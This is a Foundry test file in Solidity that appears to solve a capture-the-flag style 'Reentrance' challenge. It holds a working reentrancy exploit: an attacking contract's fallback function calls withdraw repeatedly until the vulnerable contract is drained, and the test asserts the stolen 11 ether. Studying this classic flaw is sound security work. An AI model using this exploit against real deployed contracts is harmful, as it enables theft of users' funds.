// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ReEntrancy.sol";

contract ReEntrancyAttack is Test {
    Reentrance public reEntrancy;
    address attacker = vm.addr(1);
    AttackingContract public attackingContract;

    function setUp() public {
        reEntrancy = new Reentrance();
        vm.prank(attacker);
        attackingContract = new AttackingContract(address(reEntrancy));
    }

    function test_AttackReEntrancy() public {
        vm.deal(address(this), 10 ether);
        reEntrancy.donate{value: 10 ether}(vm.addr(1234));
        // this is attacker's second account as we have to show that attacker have some money registered in balances mapping

        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        reEntrancy.donate{value: 1 ether}(address(attackingContract));
        attackingContract.attack();
        vm.stopPrank();
        assertEq(address(reEntrancy).balance, 0);
        assertEq(address(attackingContract).balance, 11 ether);
    }
}

interface IReentrance {
    function dontate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract AttackingContract {
    IReentrance public reEntrancyContract;

    constructor(address _addr) public {
        reEntrancyContract = IReentrance(_addr);
    }

    fallback() external payable {
        if (address(reEntrancyContract).balance >= 1 ether) {
            reEntrancyContract.withdraw(1 ether);
        }
    }

    function attack() public {
        reEntrancyContract.withdraw(1 ether);
    }
}
